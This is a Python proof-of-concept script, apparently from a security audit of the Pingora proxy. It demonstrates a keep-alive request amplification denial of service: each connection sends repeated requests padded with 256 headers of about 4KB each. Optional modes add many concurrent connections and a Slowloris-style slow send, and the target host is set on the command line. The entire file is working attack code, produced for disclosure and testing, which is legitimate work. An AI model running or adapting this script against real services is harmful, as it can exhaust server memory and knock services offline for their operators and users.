#!/usr/bin/env python3
"""
Finding 10 PoC: Keepalive request amplification DoS.

Demonstrates that a single TCP connection can force unlimited header buffer
allocations by sending many requests with maximum-size headers over a
keep-alive connection.

Usage:
    # Basic test: single connection
    python3 repro_keepalive_dos.py --target 127.0.0.1 --port 6188

    # Stress test: multiple connections with measurement
    python3 repro_keepalive_dos.py --target 127.0.0.1 --port 6188 --stress --connections 10 --requests 100

    # Slowloris variant: slow header sending
    python3 repro_keepalive_dos.py --target 127.0.0.1 --port 6188 --slow --delay 0.05
"""

import argparse
import socket
import sys
import threading
import time
import os


# pingora limits: MAX_HEADERS = 256, header values up to ~4KB each
MAX_HEADERS = 256
HEADER_VALUE_SIZE = 4000  # ~4KB per header value
# Total per request: ~256 * 4KB = ~1MB of headers


def generate_large_header_request(request_num: int, host: str) -> bytes:
    """Generate a request with 256 headers, each with ~4KB values."""
    lines = [
        f"GET /request-{request_num} HTTP/1.1\r\n".encode(),
        f"Host: {host}\r\n".encode(),
        b"Connection: keep-alive\r\n",
    ]

    # Fill up to MAX_HEADERS with large headers
    for i in range(MAX_HEADERS - 3):  # -3 for Host, Connection, and the request line overhead
        value = chr(ord("A") + (i % 26)) * HEADER_VALUE_SIZE
        lines.append(f"X-Pad-{i:04d}: {value}\r\n".encode())

    lines.append(b"\r\n")
    return b"".join(lines)


def send_keepalive_requests(
    host: str,
    port: int,
    num_requests: int,
    slow: bool = False,
    delay: float = 0.0,
    connection_id: int = 0,
) -> dict:
    """Send many large-header requests on a single keep-alive connection."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(65.0)  # Just above the 60s read timeout

    stats = {
        "connection_id": connection_id,
        "requests_sent": 0,
        "bytes_sent": 0,
        "responses_received": 0,
        "errors": 0,
        "start_time": time.time(),
    }

    try:
        sock.connect((host, port))
        print(f"  [Conn {connection_id}] Connected to {host}:{port}")

        for i in range(num_requests):
            request = generate_large_header_request(i, host)

            if slow:
                # Slowloris variant: send one byte at a time with delay
                for byte_idx in range(0, len(request), 100):
                    chunk = request[byte_idx : byte_idx + 100]
                    try:
                        sock.sendall(chunk)
                        if delay > 0:
                            time.sleep(delay)
                    except (BrokenPipeError, ConnectionResetError):
                        stats["errors"] += 1
                        print(f"  [Conn {connection_id}] Connection reset at request {i}")
                        return stats
            else:
                try:
                    sock.sendall(request)
                except (BrokenPipeError, ConnectionResetError):
                    stats["errors"] += 1
                    print(f"  [Conn {connection_id}] Connection reset at request {i}")
                    return stats

            stats["requests_sent"] += 1
            stats["bytes_sent"] += len(request)

            # Read the response
            try:
                response = b""
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    # Simple check: if we've read the full response
                    if b"\r\n\r\n" in response:
                        # For simple responses, the headers are enough
                        header_end = response.find(b"\r\n\r\n")
                        # Check Content-Length for body
                        headers = response[:header_end].decode(errors="replace")
                        if "Content-Length: 0" in headers or "content-length: 0" in headers:
                            break
                        # Read a bit more for the body
                        if len(response) > header_end + 4 + 100:
                            break
                        # If no content-length, just read what we have
                        if "content-length" not in headers.lower():
                            break

                stats["responses_received"] += 1
            except socket.timeout:
                stats["errors"] += 1
                print(
                    f"  [Conn {connection_id}] Timeout reading response for request {i}"
                )

            if (i + 1) % 10 == 0:
                elapsed = time.time() - stats["start_time"]
                mb_sent = stats["bytes_sent"] / (1024 * 1024)
                print(
                    f"  [Conn {connection_id}] {i+1}/{num_requests} requests sent "
                    f"({mb_sent:.1f} MB in {elapsed:.1f}s)"
                )

    except ConnectionRefusedError:
        print(f"  [Conn {connection_id}] Connection refused")
        stats["errors"] += 1
    except Exception as e:
        print(f"  [Conn {connection_id}] Error: {e}")
        stats["errors"] += 1
    finally:
        sock.close()

    stats["end_time"] = time.time()
    return stats


def run_basic_test(host: str, port: int, num_requests: int = 20):
    """Run a basic test with a single connection."""
    print(f"\nBasic Test: {num_requests} large-header requests on one connection")
    print(f"Each request: ~{MAX_HEADERS} headers × ~{HEADER_VALUE_SIZE} bytes ≈ {MAX_HEADERS * HEADER_VALUE_SIZE / (1024*1024):.1f} MB")
    print(f"Total data: ~{num_requests * MAX_HEADERS * HEADER_VALUE_SIZE / (1024*1024):.0f} MB of headers")
    print()

    stats = send_keepalive_requests(host, port, num_requests)

    elapsed = stats.get("end_time", time.time()) - stats["start_time"]
    mb_sent = stats["bytes_sent"] / (1024 * 1024)

    print(f"\nResults:")
    print(f"  Requests sent:     {stats['requests_sent']}/{num_requests}")
    print(f"  Responses received: {stats['responses_received']}")
    print(f"  Errors:            {stats['errors']}")
    print(f"  Data sent:         {mb_sent:.1f} MB")
    print(f"  Duration:          {elapsed:.1f}s")
    print(f"  Rate:              {stats['requests_sent']/max(elapsed,0.1):.1f} req/s")

    if stats["requests_sent"] == num_requests and stats["errors"] == 0:
        print(f"\n[!!] All {num_requests} requests accepted on a single connection!")
        print(f"     No keepalive request limit detected.")
        print(f"     Server allocated ~{mb_sent:.0f} MB of header buffers for one TCP connection.")
    elif stats["requests_sent"] < num_requests:
        limit = stats["requests_sent"]
        print(f"\n[INFO] Connection closed after {limit} requests")
        print(f"       This may indicate a keepalive request limit of ~{limit}")


def run_stress_test(
    host: str, port: int, num_connections: int, requests_per_conn: int, slow: bool, delay: float
):
    """Run stress test with multiple concurrent connections."""
    print(f"\nStress Test: {num_connections} connections × {requests_per_conn} requests")
    total_data_mb = (
        num_connections * requests_per_conn * MAX_HEADERS * HEADER_VALUE_SIZE / (1024 * 1024)
    )
    print(f"Total header data: ~{total_data_mb:.0f} MB")
    if slow:
        print(f"Slowloris mode: {delay*1000:.0f}ms delay per 100-byte chunk")
    print()

    threads = []
    results = []
    lock = threading.Lock()

    def worker(conn_id):
        stats = send_keepalive_requests(
            host, port, requests_per_conn, slow=slow, delay=delay, connection_id=conn_id
        )
        with lock:
            results.append(stats)

    start = time.time()
    for i in range(num_connections):
        t = threading.Thread(target=worker, args=(i,))
        threads.append(t)
        t.start()
        time.sleep(0.1)  # Stagger connections slightly

    for t in threads:
        t.join()
    elapsed = time.time() - start

    total_sent = sum(r["requests_sent"] for r in results)
    total_bytes = sum(r["bytes_sent"] for r in results)
    total_errors = sum(r["errors"] for r in results)

    print(f"\n{'='*60}")
    print(f"Stress Test Results:")
    print(f"  Connections:       {num_connections}")
    print(f"  Total requests:    {total_sent}")
    print(f"  Total data:        {total_bytes/(1024*1024):.1f} MB")
    print(f"  Total errors:      {total_errors}")
    print(f"  Duration:          {elapsed:.1f}s")
    print(f"  Throughput:        {total_sent/max(elapsed,0.1):.1f} req/s")
    print()
    print(f"Memory impact estimate:")
    print(f"  Peak concurrent allocations: ~{num_connections} × 1 MB = ~{num_connections} MB")
    print(f"  Total allocations forced:    ~{total_sent} × 1 MB = ~{total_sent} MB")
    print()
    if total_errors == 0:
        print(f"[!!] No requests were rejected — no keepalive limit detected!")
    else:
        print(f"[INFO] {total_errors} errors occurred — server may have some limits")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for keepalive request amplification DoS"
    )
    parser.add_argument("--target", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=6188, help="Target port")
    parser.add_argument("--requests", type=int, default=20, help="Requests per connection")
    parser.add_argument("--stress", action="store_true", help="Run multi-connection stress test")
    parser.add_argument("--connections", type=int, default=10, help="Number of connections (stress mode)")
    parser.add_argument("--slow", action="store_true", help="Slowloris mode: send headers slowly")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay between chunks in slow mode (seconds)")
    args = parser.parse_args()

    print(f"Finding 10 PoC: Keepalive Request Amplification DoS")
    print(f"Target: {args.target}:{args.port}")
    print(f"{'='*60}")

    if args.stress:
        run_stress_test(
            args.target, args.port, args.connections, args.requests, args.slow, args.delay
        )
    else:
        run_basic_test(args.target, args.port, args.requests)


if __name__ == "__main__":
    main()
